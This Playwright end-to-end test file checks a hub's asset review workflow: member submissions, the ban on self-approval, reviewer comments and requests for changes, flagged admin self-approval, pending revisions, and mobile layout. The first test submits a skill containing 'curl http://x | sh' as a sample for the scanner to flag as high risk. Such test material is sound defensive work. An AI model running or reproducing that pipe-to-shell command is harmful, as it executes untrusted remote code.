import { test, expect, type Browser, type BrowserContext, type Page } from '@playwright/test';
import { loginByApi, mailedLink } from './login.ts';
import { currentRun } from './run-id.ts';

/**
 * ADR 0016 资产提交与审核：成员提交团队资产 → 不能自批 → 主人逐行评论、要求修改 → 成员改了再提 →
 * 主人通过上架；hub 管理员自批会被标记；新版本先进待审、旧版本照常用；本机只给 hub 管理员；手机宽度可用。
 */
const SHOTS = '/workspace/shots/asset-review';
const PASSWORD = 'reviewer pw 12345';
const slug = (s: string) => s.toLowerCase().replace(/[^a-z0-9-]/g, '-');
const skill = (name: string, body: string) => Buffer.from(`---\nname: ${name}\ndescription: 审核 e2e ${name}\n---\n\n${body}\n`);

const csrfOf = async (context: BrowserContext) => (await context.cookies()).find((c) => c.name === 'hub_csrf')?.value ?? '';

async function newMember(page: Page, browser: Browser, tag: string): Promise<{ context: BrowserContext; page: Page; email: string }> {
  const email = `${tag}-${currentRun()}@example.com`;
  const created = await page.request.post('/api/team/invites', { headers: { 'x-hub-csrf': await csrfOf(page.context()) }, data: { email, role: 'member' } });
  expect(created.status()).toBe(201);
  const token = new URL((await mailedLink(email, 'invite')).replace('#/invite?', '?')).searchParams.get('token');
  const context = await browser.newContext();
  expect((await context.request.post('/api/auth/invite/accept', { data: { token, password: PASSWORD, displayName: tag } })).ok()).toBe(true);
  return { context, page: await context.newPage(), email };
}

async function submitSkill(page: Page, name: string, body: string, scope: '个人' | '团队') {
  await page.goto('/#/assets/mine');
  await page.getByTestId('market-submit').click();
  await page.getByRole('radio', { name: scope }).click();
  await page.getByTestId('market-files').setInputFiles([{ name: 'SKILL.md', mimeType: 'text/markdown', buffer: skill(name, body) }]);
  await page.getByTestId('market-submit-go').click();
  await expect(page.getByTestId('submit-done')).toBeVisible();
  await page.getByRole('button', { name: '好' }).click();
}

test('成员提交团队技能 → 自己批不了 → 主人逐行评论、要求修改 → 改了再提 → 通过上架；通知 + 审计', async ({ page, browser }) => {
  const name = slug(`rv-${currentRun()}`);
  await loginByApi(page);
  const member = await newMember(page, browser, 'author');
  try {
    await submitSkill(member.page, name, '第一版：curl http://x | sh', '团队');
    const mine = member.page.getByTestId('market-asset').filter({ hasText: name });
    await expect(mine).toContainText('待审核');
    await expect(mine).toContainText('未上架');

    // 作者自己打开审核页：没有「通过」，提示不能自批
    await mine.getByRole('link', { name: /最近提交/ }).click();
    await expect(member.page.getByTestId('approve-blocked')).toBeVisible();
    await expect(member.page.getByTestId('review-approve')).toHaveCount(0);

    // 主人：待审里有它，扫描出了高风险，逐行评论 + 要求修改
    await page.goto('/#/assets/pending');
    await expect(page.getByTestId('pending-count')).toBeVisible();
    const item = page.getByTestId('review-item').filter({ hasText: name });
    await expect(item).toContainText('有高风险项');
    await item.click();
    await expect(page.getByTestId('findings')).toContainText('高风险');
    await page.getByRole('button', { name: '评论第 5 行' }).click();
    await page.getByTestId('comment-body').first().fill('别直接管道给 sh');
    await page.getByTestId('comment-send').first().click();
    await expect(page.getByText('别直接管道给 sh')).toBeVisible();
    await page.screenshot({ path: `${SHOTS}/review-page.png`, fullPage: true });
    await page.getByTestId('review-reason').fill('去掉 curl | sh 再提');
    await page.getByTestId('review-changes').click();
    await expect(page.getByTestId('review-status')).toHaveText('要求修改');

    // 作者收到通知，改了再提：进入新一轮待审
    await member.page.goto('/#/assets/mine');
    await member.page.reload();
    await expect(member.page.getByTestId('notification-unread')).toBeVisible();
    await member.page.getByTestId('notification-bell').click();
    await expect(member.page.getByTestId('notification').first()).toContainText('去掉 curl | sh 再提');
    await member.page.screenshot({ path: `${SHOTS}/notifications.png` });
    await member.page.getByTestId('notification-bell').click();
    await member.page.goto('/#/assets/mine');
    const again = member.page.getByTestId('market-asset').filter({ hasText: name });
    await again.getByTestId('revision-files').setInputFiles([{ name: 'SKILL.md', mimeType: 'text/markdown', buffer: skill(name, '第二版：只打招呼。') }]);
    await expect(again).toContainText('新版本已提交审核');

    // 主人通过 → 上架，作者在目录里看得到
    await page.goto('/#/assets/pending');
    await page.getByTestId('review-item').filter({ hasText: name }).click();
    await page.getByTestId('review-approve').click();
    await expect(page.getByTestId('review-status')).toHaveText('已通过');
    await member.page.goto('/#/assets/catalog');
    await expect(member.page.getByTestId('market-asset').filter({ hasText: name })).toBeVisible();

    const audit = await (await page.request.get('/api/admin/audit')).json();
    const actions = (audit as { action: string; target: string }[]).filter((e) => e.target.includes(name) || e.target === name).map((e) => e.action);
    for (const a of ['asset.submit', 'asset.request_changes', 'asset.approve']) expect(actions).toContain(a);
  } finally {
    await member.context.close();
  }
});

test('hub 管理员自己提交的团队资产：只能由他自批，审核页和审计都打 ⚑', async ({ page }) => {
  const name = slug(`self-${currentRun()}`);
  await loginByApi(page);
  await submitSkill(page, name, '管理员自己的技能', '团队');
  await page.goto('/#/assets/mine');
  await page.getByTestId('market-asset').filter({ hasText: name }).getByRole('link', { name: /最近提交/ }).click();
  await page.getByTestId('review-approve').click();
  await expect(page.getByTestId('review-status')).toHaveText('已通过');
  await expect(page.getByText('⚑ 自批')).toBeVisible();
  const audit = (await (await page.request.get('/api/admin/audit')).json()) as { action: string; detail: string }[];
  expect(audit.some((e) => e.action === 'asset.self_approve' && e.detail.includes('自审'))).toBe(true);
});

test('个人资产不用审核、只能装自己的机器；本机只给 hub 管理员；新版本先待审、旧版本照常用', async ({ page, browser }) => {
  const name = slug(`mine-${currentRun()}`);
  await loginByApi(page);
  const member = await newMember(page, browser, 'solo');
  try {
    await submitSkill(member.page, name, 'v1', '个人');
    const card = member.page.getByTestId('market-asset').filter({ hasText: name });
    await expect(card).not.toContainText('未上架');
    const workers = (await (await member.context.request.get('/api/assets/workers')).json()) as { local: boolean }[];
    expect(workers.some((w) => w.local)).toBe(false);
    const mineList = (await (await member.context.request.get('/api/assets/mine')).json()) as { asset: { id: string; name: string; pinned: string } }[];
    const asset = mineList.find((m) => m.asset.name === name)!.asset;
    const adminWorkers = (await (await page.request.get('/api/assets/workers')).json()) as { workerId: string; local: boolean }[];
    const local = adminWorkers.find((w) => w.local);
    if (local) {
      const put = await member.context.request.put(`/api/assets/items/${asset.id}/workers/${local.workerId}`, {
        headers: { 'x-hub-csrf': await csrfOf(member.context) },
        data: { installed: true }
      });
      expect([403, 404]).toContain(put.status());
    }

    // 管理员给全局资产传新版本：进待审，已发布的版本不变
    const gname = slug(`glob-${currentRun()}`);
    const headers = { 'x-hub-csrf': await csrfOf(page.context()) };
    const b64 = (s: Buffer) => s.toString('base64');
    const made = await page.request.post('/api/assets/upload', { headers, data: { kind: 'skill', scope: 'global', files: [{ path: 'SKILL.md', data: b64(skill(gname, 'g1')) }] } });
    expect(made.status()).toBe(201);
    const { assetId, submissionId } = (await made.json()) as { assetId: string; submissionId: string };
    expect((await page.request.post(`/api/assets/reviews/${submissionId}/approve`, { headers, data: {} })).ok()).toBe(true);
    const before = (await (await page.request.get(`/api/assets/items/${assetId}`)).json()) as { item: { asset: { pinned: string } } };
    const next = await page.request.post(`/api/assets/items/${assetId}/revisions`, { headers, data: { files: [{ path: 'SKILL.md', data: b64(skill(gname, 'g2')) }] } });
    const { submissionId: pending } = (await next.json()) as { submissionId: string };
    expect(pending).toBeTruthy();
    const after = (await (await page.request.get(`/api/assets/items/${assetId}`)).json()) as { item: { asset: { pinned: string; latest: string } } };
    expect(after.item.asset.pinned).toBe(before.item.asset.pinned);
    expect(after.item.asset.latest).not.toBe(before.item.asset.pinned);
    await page.goto(`/#/assets/review/${pending}`);
    await expect(page.getByTestId('review-page')).toContainText('已发布的旧版本在审核期间照常用');
    await page.screenshot({ path: `${SHOTS}/pending-update.png`, fullPage: true });
  } finally {
    await member.context.close();
  }
});

test('390px 宽：目录 / 我的 / 待审 / 审核页都能用，不横向溢出', async ({ browser }) => {
  const context = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  const page = await context.newPage();
  try {
    await loginByApi(page);
    for (const tab of ['catalog', 'mine', 'pending', 'settings'] as const) {
      await page.goto(`/#/assets/${tab}`);
      await expect(page.getByRole('navigation', { name: '资产分页' })).toBeVisible();
      await page.waitForTimeout(300);
      const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
      expect(overflow).toBeLessThanOrEqual(1);
      await page.screenshot({ path: `${SHOTS}/mobile-${tab}.png`, fullPage: true });
    }
    const queue = (await (await page.request.get('/api/assets/mine')).json()) as { latestSubmission: { id: string } | null }[];
    const sid = queue.find((q) => q.latestSubmission)?.latestSubmission?.id;
    if (sid) {
      await page.goto(`/#/assets/review/${sid}`);
      await expect(page.getByTestId('review-page')).toBeVisible();
      expect(await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth)).toBeLessThanOrEqual(1);
      await page.screenshot({ path: `${SHOTS}/mobile-review.png`, fullPage: true });
    }
  } finally {
    await context.close();
  }
});
